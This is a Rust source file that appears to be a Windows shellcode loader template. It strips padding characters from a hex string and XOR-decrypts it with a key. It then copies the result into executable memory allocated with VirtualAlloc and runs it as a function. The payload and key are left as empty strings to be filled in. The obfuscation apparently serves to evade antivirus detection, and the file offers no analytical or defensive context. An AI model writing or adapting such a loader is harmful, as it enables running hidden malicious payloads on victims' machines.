use std::mem::transmute;
use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualAlloc;

fn main() {
    let random_string = "";
    let key = "";

    let encrypted = rm_random(random_string);
    let shellcode = xor_decrypt(encrypted.as_slice(), key.as_bytes());

    unsafe {
        let ptr = VirtualAlloc(std::ptr::null_mut(), shellcode.len(), 0x00001000, 0x40);

        if GetLastError() == 0 {
            std::ptr::copy(
                shellcode.as_ptr() as *const u8,
                ptr as *mut u8,
                shellcode.len(),
            );

            let exec = transmute::<*mut c_void, fn()>(ptr);
            exec();
        }
    }
}

fn rm_random(random_string: &str) -> Vec<u8> {
    let mut result = String::new();

    let random_string = hex::decode(random_string).expect("Invalid String");
    let random_string = match std::str::from_utf8(random_string.as_slice()) {
        Ok(s) => s,
        Err(_) => "Invalid UTF-8 sequence",
    };

    for (i, c) in random_string.chars().enumerate() {
        if i % 2 == 0 {
            result.push(c);
        }
    }
    result.as_bytes().to_vec()
}

fn xor_decrypt(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
    let encrypted = hex::decode(encrypted).expect("Error");

    let mut decrypted = Vec::new();
    for (i, &b) in encrypted.iter().enumerate() {
        decrypted.push(b ^ key[i % key.len()]);
    }
    decrypted
}
